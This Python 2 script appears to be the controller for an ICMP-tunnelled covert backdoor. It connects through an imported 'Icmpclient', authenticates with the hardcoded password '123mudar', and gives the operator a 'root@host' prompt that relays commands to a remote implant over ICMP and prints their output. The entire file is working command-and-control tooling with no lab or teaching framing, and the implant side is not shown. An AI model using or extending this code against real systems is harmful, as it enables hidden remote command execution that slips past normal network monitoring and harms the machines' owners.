#!/usr/bin/env python
# encoding: utf-8

import os, sys, socket, struct, select, time, string, argparse
ICMP_ECHO_REQUEST = 8
PASSWORD = "123mudar"
from icmpclient import Icmpclient

def shell(client):
    cmd = ""
    try:

        while not "exit" in cmd:
            sys.stdout.write("root@" + client.dest + ": $ ")
            cmd = raw_input()
            client.send(cmd)
            resp = client.recv(5)
            if not "N0TH1NG" in resp:
                print resp

    except (EOFError, KeyboardInterrupt): #ctrl+D/C == exit

        cmd = "exit"
        client.send(cmd)
        print # clean screen

    sys.exit()

s = Icmpclient("127.0.0.1")
resp = "N0TH1NG"

while "N0TH1NG" in resp:
    resp = s.recv(10)

s.send(PASSWORD)
resp = s.recv(10)
if resp == "Connected":
    shell(s)
